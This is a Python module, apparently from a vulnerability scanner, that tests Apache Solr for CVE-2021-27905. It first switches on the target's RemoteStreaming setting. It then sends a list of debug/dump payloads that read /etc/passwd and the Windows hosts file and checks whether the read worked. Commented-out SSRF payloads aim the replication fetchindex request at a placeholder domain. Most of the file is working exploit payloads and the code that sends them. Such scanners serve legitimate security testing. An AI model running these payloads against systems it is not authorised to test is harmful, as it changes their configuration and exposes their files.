#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2021_27905_payloads = [
    # * SSRF
    # {'path': 'solr/{DBNAME}/replication?command=fetchindex&masterUrl=http://DNSDOMAIN'},
    # {'path': '{DBNAME}/replication?command=fetchindex&masterUrl=http://DNSDOMAIN'},
    # {'path': 'replication?command=fetchindex&masterUrl=http://DNSDOMAIN'},
    # * FileRead
    {'path': 'solr/{DBNAME}/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'},
    {'path': 'solr/{DBNAME}/debug/dump?param=ContentStreams&stream.url=file:///C:\Windows\System32\drivers\etc\hosts'},
    {'path': 'solr/{DBNAME}/debug/dump?param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'},
    {'path': '{DBNAME}/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'},
    {'path': '{DBNAME}/debug/dump?param=ContentStreams&stream.url=file:///C:\Windows\System32\drivers\etc\hosts'},
    {'path': '{DBNAME}/debug/dump?param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'},
    {'path': 'debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'},
    {'path': 'debug/dump?param=ContentStreams&stream.url=file:///C:\Windows\System32\drivers\etc\hosts'},
    {'path': 'debug/dump?param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'},
]

def cve_2021_27905_scan(self, clients):
    ''' 当Solr不启用身份验证时, 攻击者可以直接制造请求以启用特定配置, 最终导致SSRF或任意文件读取 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SSRF/FileRead',
        'vul_id': 'CVE-2021-27905',
    }

    self.enable(client)                                         # * 开启Solr的RemoteStreaming
    if not self.RemoteStreaming:
        return None

    for payload in cve_2021_27905_payloads:                     # * Payload
        path = payload['path'].format(DBNAME=self.db_name)      # * Path

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
